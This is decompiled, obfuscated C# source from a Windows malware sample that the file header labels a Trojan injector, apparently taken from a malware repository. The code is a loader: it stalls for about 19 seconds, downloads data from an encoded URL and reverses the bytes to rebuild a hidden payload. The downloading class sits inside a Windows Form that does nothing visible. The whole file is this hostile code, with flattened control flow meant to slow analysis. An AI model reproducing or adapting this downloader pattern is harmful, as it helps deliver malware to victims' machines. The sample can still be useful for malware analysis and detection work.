// Decompiled with JetBrains decompiler
// Type: 
// Assembly: Wsatl, Version=3.5.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F283BCB2-3693-2101-CC7E-032C686F7A1E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\Trojan.Win64.Injects.byv-ee6992c0989b76c0dad952b55107b5bfff1e390e966bbaf9384bea9ab2854370.exe

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Net;
using System.Threading;
using System.Windows.Forms;

public sealed class \u0003 : Form
{
  private IContainer \uE000;

  public \u0003()
  {
    if ((false ? 0 : 1) != 0)
      goto label_3;
label_1:
    // ISSUE: explicit constructor call
    base.\u002Ector();
    if ((false ? 0 : 1) == 0)
      return;
    this.\uE002();
    return;
label_3:
    this.\uE000 = (IContainer) null;
    goto label_1;
  }

  private byte[] \uE000(string _param1)
  {
    try
    {
      if ((false ? 0 : 1) != 0)
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
    }
    catch
    {
    }
    DateTime now = DateTime.Now;
    if ((false ? 0 : 1) != 0)
      goto label_5;
label_4:
    DateTime dateTime1;
    DateTime dateTime2 = dateTime1.AddSeconds(19.0);
    DateTime dateTime3;
    if ((false ? 0 : 1) != 0)
      dateTime3 = dateTime2;
    while ((!(dateTime3 > DateTime.Now) ? 0 : 1) != 0)
      Thread.Sleep(5);
    using (MemoryStream memoryStream = new MemoryStream())
    {
      HttpWebResponse response = (HttpWebResponse) WebRequest.Create(new Uri(_param1)).GetResponse();
      try
      {
        Stream responseStream = response.GetResponseStream();
        try
        {
          int count1 = 1024;
label_20:
          int num1 = \uE010.\uE021(15);
          int num2 = -22;
label_14:
          byte[] buffer;
          int count2;
          while (true)
          {
            num2 ^= 15;
label_16:
            int num3 = \uE010.\uE021(20);
            while (true)
            {
              switch (num3 ^ 21)
              {
                case 23:
label_17:
                  num2 = \uE010.\uE021(29);
                  num3 = 12;
                  continue;
                case 24:
                  switch (num2 + 29)
                  {
                    case 0:
                      goto label_20;
                    case 1:
                      switch (num1)
                      {
                        case 24:
                          buffer = new byte[count1];
                          num1 = \uE010.\uE021(18);
                          goto label_13;
                        case 25:
                          count2 = 0;
                          num1 = 2;
                          goto label_13;
                        case 26:
                          if (count2 != 0)
                          {
                            num1 = 3;
                            goto label_13;
                          }
                          else
                            goto label_28;
                        case 27:
                          goto label_27;
                        default:
                          goto label_22;
                      }
                    case 2:
label_13:
                      num1 ^= 24;
                      goto label_17;
                    default:
                      num3 = 2;
                      continue;
                  }
                case 25:
                  goto label_14;
                default:
                  goto label_16;
              }
            }
label_22:
            num2 = -20;
          }
label_27:
          memoryStream.Write(buffer, 0, count2);
label_28:
          if (((count2 = responseStream.Read(buffer, 0, count1)) == 0 ? 0 : 1) == 0)
            return memoryStream.ToArray();
          goto label_27;
        }
        finally
        {
          if ((responseStream == null ? 1 : 0) == 0)
            responseStream.Dispose();
        }
      }
      finally
      {
        if ((response == null ? 1 : 0) == 0)
          response.Dispose();
      }
    }
label_5:
    dateTime1 = now;
    goto label_4;
  }

  internal byte[] \uE001()
  {
    byte[] numArray1 = this.\uE000(\uE009.\uE000(37313));
    if ((false ? 0 : 1) != 0)
      goto label_3;
label_1:
    List<byte> byteList1 = new List<byte>();
    if ((false ? 0 : 1) != 0)
      goto label_4;
label_2:
    byte[] numArray2;
    int length = numArray2.Length;
    int index;
    if ((false ? 0 : 1) != 0)
      index = length;
    List<byte> byteList2;
    while ((index-- <= 0 ? 0 : 1) != 0)
      byteList2.Add(numArray2[index]);
    return byteList2.ToArray();
label_4:
    byteList2 = byteList1;
    goto label_2;
label_3:
    numArray2 = numArray1;
    goto label_1;
  }

  protected override void Dispose(bool _param1)
  {
    int num1 = (!_param1 ? 1 : 0) != 0 ? 0 : (this.\uE000 != null ? 1 : 0);
    if ((false ? 0 : 1) != 0)
      goto label_2;
label_1:
    bool flag;
    if ((!flag ? 1 : 0) == 0)
      this.\uE000.Dispose();
    int num2 = _param1 ? 1 : 0;
    if ((false ? 0 : 1) == 0)
      return;
    base.Dispose(num2 != 0);
    return;
label_2:
    flag = num1 != 0;
    goto label_1;
  }

  private void \uE002()
  {
    if ((false ? 0 : 1) != 0)
      goto label_18;
label_1:
    SizeF sizeF = new SizeF(11f, 24f);
    if ((false ? 0 : 1) != 0)
      goto label_19;
label_2:
    if ((false ? 0 : 1) != 0)
      goto label_20;
label_3:
    this.ClientSize = new Size(653, 327);
label_11:
    int num1 = \uE011.\uE024(34);
    int num2 = 58;
label_5:
    while (true)
    {
      num2 ^= 26;
label_7:
      int num3 = \uE011.\uE024(31);
      while (true)
      {
        switch ((num3 ^ 24) + 29)
        {
          case 0:
            switch (num2)
            {
              case 30:
                goto label_11;
              case 31:
                switch (num1)
                {
                  case 30:
                    this.Name = \uE009.\uE000(37171);
                    num1 = 59;
                    goto label_4;
                  case 31:
                    this.ResumeLayout(false);
                    num1 = 58;
                    goto label_4;
                  case 32:
                    this.Text = \uE009.\uE000(37171);
                    num1 = \uE011.\uE024(27);
                    goto label_4;
                  case 33:
                    goto label_17;
                  default:
                    goto label_13;
                }
              case 32:
label_4:
                num1 ^= 27;
                goto label_10;
              default:
                num3 = -4;
                continue;
            }
          case 1:
label_10:
            num2 = \uE011.\uE024(34);
            num3 = -3;
            continue;
          case 2:
            goto label_5;
          default:
            goto label_7;
        }
      }
label_13:
      num2 = 4;
    }
label_17:
    return;
label_20:
    this.AutoScaleMode = AutoScaleMode.Font;
    goto label_3;
label_19:
    this.AutoScaleDimensions = sizeF;
    goto label_2;
label_18:
    this.SuspendLayout();
    goto label_1;
  }
}
